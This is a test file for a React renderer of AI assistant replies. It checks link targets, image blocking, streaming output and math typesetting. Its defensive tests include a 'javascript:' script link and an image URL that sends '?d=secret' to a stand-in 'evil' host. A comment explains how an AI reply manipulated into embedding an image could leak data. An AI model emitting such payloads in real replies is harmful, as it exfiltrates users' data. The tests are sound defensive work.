import { cleanup, render, screen, waitFor } from "@testing-library/react";
import { MemoryRouter } from "react-router";
import { afterEach, describe, expect, it } from "vitest";
import { AiMarkdown, StreamingAiMarkdown } from "../ai-markdown";

afterEach(cleanup);

function renderReply(content: string, inRouter = true) {
  const reply = <AiMarkdown content={content} />;
  render(inRouter ? <MemoryRouter>{reply}</MemoryRouter> : reply);
}

describe("links in a reply", () => {
  // A page of the app opens in place, keeping the person's session and the
  // assistant open beside it, rather than in a second copy of the app.
  it("opens a page of the app in place", () => {
    renderReply("Open [Rate matrices](/billing/configuration-files/rate-matrices).");

    const link = screen.getByRole("link", { name: "Rate matrices" });
    expect(link).toHaveAttribute("href", "/billing/configuration-files/rate-matrices");
    expect(link).not.toHaveAttribute("target");
  });

  it("opens another site in a new tab, without handing it this window", () => {
    renderReply("See [the FMCSA](https://www.fmcsa.dot.gov/).");

    const link = screen.getByRole("link", { name: "the FMCSA" });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("treats a protocol-relative link as another site", () => {
    renderReply("[Elsewhere](//evil.example/x)");

    expect(screen.getByRole("link", { name: "Elsewhere" })).toHaveAttribute("target", "_blank");
  });

  it("never renders a script link", () => {
    renderReply("[Click](javascript:alert(1))");

    const link = screen.queryByRole("link", { name: "Click" });
    expect(link?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  // Replies are rendered in places with no router too; a page link there is
  // an ordinary link rather than a crash.
  it("falls back to a plain link outside the router", () => {
    renderReply("Open [Invoices](/billing/invoices).", false);

    expect(screen.getByRole("link", { name: "Invoices" })).toHaveAttribute(
      "href",
      "/billing/invoices",
    );
  });
});

describe("images in a reply", () => {
  // An image loads the moment it renders. A reply talked into embedding one
  // would send whatever it put in the address to that host, unclicked.
  it("never loads an image, and offers it as a link to open deliberately", () => {
    const { container } = render(
      <MemoryRouter>
        <AiMarkdown content="![rates](https://storage.googleapis.com/evil/x.png?d=secret)" />
      </MemoryRouter>,
    );

    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: "rates" });
    expect(link).toHaveAttribute("href", "https://storage.googleapis.com/evil/x.png?d=secret");
    expect(link).toHaveAttribute("target", "_blank");
  });

  it("names an image with no description rather than drawing nothing", () => {
    const { container } = render(
      <MemoryRouter>
        <AiMarkdown content="![](https://example.com/a.png)" />
      </MemoryRouter>,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("link", { name: "image" })).toBeInTheDocument();
  });
});

/**
 * A streaming reply is parsed block by block so only the block still arriving
 * is parsed again on each token. What it draws has to be what the whole reply
 * parsed at once draws, or the answer would shift when the saved copy
 * replaces the streamed one.
 */
describe("a reply still streaming", () => {
  const reply = [
    "## Loads at risk",
    "",
    "Three loads are **late** to pick up. See [the board](/dispatch/board).",
    "",
    "- S1 at Dallas",
    "- S2 at Austin",
    "",
    "- S3 at Waco",
    "",
    "```",
    "select *",
    "",
    "from shipments",
    "```",
    "",
    "| Load | ETA |",
    "| --- | --- |",
    "| S1 | 14:00 |",
    "",
    "> Weather on I-35.",
    "",
    "1. call the shipper",
    "",
    "2. reschedule",
    "",
    "---",
    "",
    "Done.",
  ].join("\n");

  function drawn(node: React.ReactNode): string {
    const { container, unmount } = render(<MemoryRouter>{node}</MemoryRouter>);
    const html = container.innerHTML;
    unmount();
    return html;
  }

  it("draws exactly what the whole reply parsed at once draws", () => {
    for (const end of [reply.length, reply.indexOf("- S3"), reply.indexOf("from shipments")]) {
      const text = reply.slice(0, end);
      expect(drawn(<StreamingAiMarkdown content={text} />)).toBe(
        drawn(<AiMarkdown content={text} />),
      );
    }
  });
});

/**
 * KaTeX is most of a reply renderer's weight and almost no reply has math, so
 * it is fetched the first time one does. Until it arrives the math shows as
 * written, inline and in its own box, and is then typeset in place.
 */
describe("math in a reply", () => {
  it("shows math as written until the typesetter arrives, then typesets it", async () => {
    renderReply("$$a + b$$\n\nThe rate is $r = d / t$ per mile.");

    expect(document.querySelector(".md-math-pending")?.textContent).toBe("r = d / t");
    expect(document.querySelector("pre.md-math-raw")?.textContent).toContain("a + b");
    expect(document.querySelector(".md-code")).toBeNull();

    await waitFor(() => expect(document.querySelector(".katex-display")).not.toBeNull());
    expect(document.querySelectorAll(".katex")).toHaveLength(2);
    expect(document.querySelector(".md-math-pending")).toBeNull();
  });

  it("leaves money as money", () => {
    renderReply("$48,210.00 across six customers");

    expect(screen.getByText(/\$48,210\.00 across six customers/)).toBeInTheDocument();
    expect(document.querySelector(".md-math-pending, .katex")).toBeNull();
  });
});
